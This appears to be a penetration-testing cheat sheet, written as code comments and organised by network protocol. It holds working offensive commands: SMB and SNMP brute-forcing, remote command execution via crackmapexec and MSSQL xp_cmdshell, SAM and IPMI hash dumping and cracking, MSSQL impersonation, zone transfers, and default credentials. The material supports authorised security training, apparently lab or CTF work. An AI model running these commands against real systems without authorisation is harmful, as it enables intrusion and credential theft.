// Protocols
//! SMB ( Server Message Block )
//* Anonymous login
// smbclient -N -L //{ip}/
//* Login
// smbclient -L //{ip}/ -U {username}%{password}
//* Commands
// ls => list files
// cd {dir} => change directory
// get => download file
//* Reading shares on windows
// win + r => \\{ip}\{share-name}
// cmd => dir \\{ip}\{share-name} /user:{username} {password}
//* Using rcpclient to interact with the SMB server
// rpcclient -U "{username | null}%{password | null}" {ip} => connect to the server
// srvinfo =>	Server information.
// enumdomains =>	Enumerate all domains that are deployed in the network.
// querydominfo => 	Provides domain, server, and user information of deployed domains.
// netshareenumall => 	Enumerates all available shares.
// netsharegetinfo <share> =>	Provides information about a specific share.
// enumdomusers => 	Enumerates all domain users.
// queryuser <RID> =>	Provides information about a specific user.
//* Config file
// /etc/samba/smb.conf
//* Dangerous settings
// browseable = yes => 	Allow listing available shares in the current share
// read only = no => 	Forbid the creation and modification of files
// writable = yes =>	Allow users to create and modify files
// guest ok = yes =>	Allow connecting to the service without using a password
// enable privileges = yes	=> Honor privileges assigned to specific SID
// create mask = 0777 =>	What permissions must be assigned to the newly created files
// directory mask = 0777=>	What permissions must be assigned to the newly created directories
// logon script = script.sh =>	What script needs to be executed on the user's login
// magic script = script.sh =>	Which script should be executed when the script gets closed
// magic output = script.out => 	Where the output of the magic script needs to be stored
//* Running an smb server with Impacket
// at virtenv
// sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/sleepwell/lab/
// to transfer a file to it use : move {file-name} \\{ip}\CompData
//* Brute forcing smb login
// crackmapexec smb {ip} -u {username} -p {password-list} --local-auth
//* RCE
// crackmapexec smb {ip} -u {smb-username} -p '{smb-password}' -x '{cmd}' --exec-method smbexec
//* Enumerating logged in users in a subnet
// crackmapexec smb {net-ip}/24 -u {smd-username} -p '{smb-password}' --loggedon-users
//* Extract Hashes from SAM Database
// crackmapexec smb {ip} -u {smb-username} -p '{smb-password}' --sam
//! NFS ( Network File System )
//* Config file
// /etc/exports
//* Dangerous settings
// rw =>	Read and write permissions.
// insecure =>	Ports above 1024 will be used.
// nohide =>	If another file system was mounted below an exported directory, this directory is exported by its own exports entry.
// no_root_squash =>	All files created by root are kept with the UID/GID 0.
//* Getting shares
// showmount -e {ip}
//* Mounting shares
// sudo mount -t nfs {ip}:/ ./{target-folder}/ -o nolock
//* Unmounting shares
// sudo umount ./{target-folder}/
//! DNS ( Domain Name System )
//* Config file
// /etc/bind/named.conf.local
//* Dangerous settings
// allow-query => Defines which hosts are allowed to send requests to the DNS server.
// allow-recursion =>	Defines which hosts are allowed to send recursive requests to the DNS server.
// allow-transfer =>	Defines which hosts are allowed to receive zone transfers from the DNS server.
// zone-statistics =>	Collects statistical data of zones.
//* Getting zone file with a dns record transfer
// only works is there no authentication
// dig axfr @{ip} {domain-name}
//* Brute forcing subdomains
// dnsenum --dnsserver {dns-ip} --enum -p 0 -s 0 -o subdomains.txt -f subdomains-top1million-110000.txt {domain-name}
//! SMTP ( Simple Mail Transfer Protocol )
//* Config file
// /etc/postfix/main.cf
//* Dangerous settings
// Open Relay Configuration
// mynetworks = 0.0.0.0/0
// with this setting anyone can use the SMTP server to send emails
// being a relay server its trusted by other mail servers and wont be marked as spam
//* Connecting to the SMTP server
// telnet {ip} 25
// HELO {domain-name}
//* Sending email
// MAIL FROM:{from-email}
// RCPT TO:{to-email}
// DATA
// {email-body}
// .
//* Open relay test
// nmap {ip} -p25 --script smtp-open-relay -v
//! IMAP ( Internet Message Access Protocol )
//* Ports
// 143 => IMAP
// 993 => IMAPS
//* Commands
// 1 LOGIN username password => User's login.
// 1 LIST "" * =>	Lists all directories.
// 1 CREATE "INBOX" =>	Creates a mailbox with a specified name.
// 1 DELETE "INBOX" =>	Deletes a mailbox.
// 1 RENAME "ToRead" "Important" =>	Renames a mailbox.
// 1 LSUB "" * => 	Returns a subset of names from the set of names that the User has declared as being active or subscribed.
// 1 SELECT INBOX =>	Selects a mailbox so that messages in the mailbox can be accessed.
// 1 UNSELECT INBOX =>	Exits the selected mailbox.
// 1 FETCH <ID> all =>	Retrieves data associated with a message in the mailbox.
// 1 CLOSE =>	Removes all messages with the Deleted flag set.
// 1 LOGOUT =>	Closes the connection with the IMAP server.
//* Getting MailBoxes
// curl -k 'imaps://{ip}' --user {username}:{password}
//* Connecting to the IMAP server
// openssl s_client -connect {ip}:993
//! POP3 ( Post Office Protocol 3 )
//* Ports
// 110 => POP3
// 995 => POP3S
//* Commands
// USER username =>	Identifies the user.
// PASS password =>	Authentication of the user using its password.
// STAT =>	Requests the number of saved emails from the server.
// LIST =>	Requests from the server the number and size of all emails.
// RETR id =>	Requests the server to deliver the requested email by ID.
// DELE id => Requests the server to delete the requested email by ID.
// CAPA =>	Requests the server to display the server capabilities.
// RSET =>	Requests the server to reset the transmitted information.
// QUIT =>	Closes the connection with the POP3 server.
//* Connecting to the POP3 server
// openssl s_client -connect {ip}:pop3s
//! SNMP ( Simple Network Management Protocol )
//* Config file
// /etc/snmp/snmpd.conf
//* Dangerous settings
// rwuser noauth =>	Provides access to the full OID tree without authentication.
// rwcommunity <community string> <IPv4 address> =>	Provides access to the full OID tree regardless of where the requests were sent from.
// rwcommunity6 <community string> <IPv6 address> =>	Same access as with rwcommunity with the difference of using IPv6.
//* Connecting to the SNMP server and walking through the OID tree
// snmpwalk -v2c -c public {ip}
//* Brute forcing community strings
// onesixtyone -c snmp.txt {ip}
//! MYSQL
//* Config file
// /etc/mysql/mysql.conf.d/mysqld.cnf
//* Dangerous settings
// user =>	Sets which user the MySQL service will run as.
// password	=> Sets the password for the MySQL user.
// admin_address	=> The IP address on which to listen for TCP/IP connections on the administrative network interface.
// debug	=> This variable indicates the current debugging settings
// sql_warnings	 => This variable controls whether single-row INSERT statements produce an information string if warnings occur.
// secure_file_priv => 	This variable is used to limit the effect of data import and export operations.
//* Nmap script
// sudo nmap {ip} -sV -sC -p3306 --script mysql*
//* Connecting to the MySQL server
// mysql -u {user} -p{password} -h {ip}
//* Enabling write/read
// if we have previliges
// sp_configure 'show advanced options', 1
// RECONFIGURE
// sp_configure 'Ole Automation Procedures', 1
// RECONFIGURE
//! MSSQL ( Microsoft SQL Server )
//* Nmap script
// sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 {ip}
//* Connecting to the MSSQL server
// at /ctf
// python3 impacket/examples/mssqlclient.py {username}:{password}@{ip} -port 1433 -windows-auth
//* Connecting to the MSSQL server with a domain user
// python3 impacket/examples/mssqlclient.py .\\{username}:{password}@{ip} -port 1433 -windows-auth
//* RCE
// if enabled : xp_cmdshell 'whoami'
//* Enabling xp_cmdshell
// if we have priveleges
// RECONFIGURE
// EXECUTE sp_configure 'xp_cmdshell', 1
// RECONFIGURE
//* Writing a file to the server
// DECLARE @OLE INT
// DECLARE @FileID INT
// EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
// EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, '{file-path}/{file-name}', 8, 1
// EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '{file-content}'
// EXECUTE sp_OADestroy @FileID
// EXECUTE sp_OADestroy @OLE
//* Impersonate Existing Users with MSSQL
// see who we can impersonate
// SELECT distinct b.name
// FROM sys.server_permissions a
// INNER JOIN sys.server_principals b
// ON a.grantor_principal_id = b.principal_id
// WHERE a.permission_name = 'IMPERSONATE'
// impersonate a user of them and check their privileges
// EXECUTE AS LOGIN = '{username}'
// SELECT SYSTEM_USER
// SELECT IS_SRVROLEMEMBER('sysadmin')
// GO
//* Identify linked Servers in MSSQL
// SELECT srvname, isremote FROM sysservers
// 0 means its linked
//* Execute commands on linked servers
// EXECUTE('{query}') AT [{linked-server-name}]
//! IPMI ( Intelligent Platform Management Interface )
//* Nmap script
// sudo nmap -sU --script ipmi-version -p 623 {ip}
//* Metasploit Version Scan
// use auxiliary/scanner/ipmi/ipmi_version
// set rhosts {ip}
// show options
// run
//* Metasploit Dumping Hashes
// use auxiliary/scanner/ipmi/ipmi_dumphashes
// set rhosts 10.129.202.5
// show options
// run
//* Cracking hashes using hashcat
// hashcat -m 7300 ipmi_hashes.txt rockyou.txt
//* Default credentials
// ADMIN:ADMIN
// root:calvin
//! SSH ( Secure Shell )
//* Config file
// /etc/ssh/sshd_config
//* Dangerous settings
// PasswordAuthentication yes	=> Allows password-based authentication.
// PermitEmptyPasswords yes =>	Allows the use of empty passwords.
// PermitRootLogin yes =>	Allows to log in as the root user.
// Protocol 1 =>	Uses an outdated version of encryption.
// X11Forwarding yes	=> Allows X11 forwarding for GUI applications.
// AllowTcpForwarding yes	 => Allows forwarding of TCP ports.
// PermitTunnel	=> Allows tunneling.
// DebianBanner yes	=> Displays a specific banner when logging in.
//* Connecting to the SSH server
// ssh {username}@{ip}
//* Connecting to the SSH server with a private key
// ssh -i {private-key} {username}@{ip}
//! Rsync
//* Probing for Accessible Shares
// rsync -av --list-only rsync://{ip}/
//* Downloading Files
// rsync -av rsync://{ip}/{share-name}
//! R-Services
//* Getting all users
// rusers -al {ip}
//* Login
// rlogin -l {username} {ip}
//* Copy file
// rcp ./localfile.txt {ip}:/path/to/remote-file.txt
//* Open Shell
// rsh -l {username} {ip}
//* Execute Command
// rexec -l {username} {ip} '{cmd}'
//! RDP ( Remote Desktop Protocol )
//* Nmap script
// nmap -sV -sC {ip} -p3389 --script rdp*
//* Connecting to the RDP server
// xfreerdp /u:{username} /p:"{passsword}" /v:{ip}
//! WinRM ( Windows Remote Management )
//* Nmap script
// nmap -sV -sC {ip} -p5985,5986 --disable-arp-ping -n
//* Connecting to the WinRM server
// at /ctf/evil-Winrm
// ruby evil-winrm.rb -i {ip} -u {username} -p '{password}'


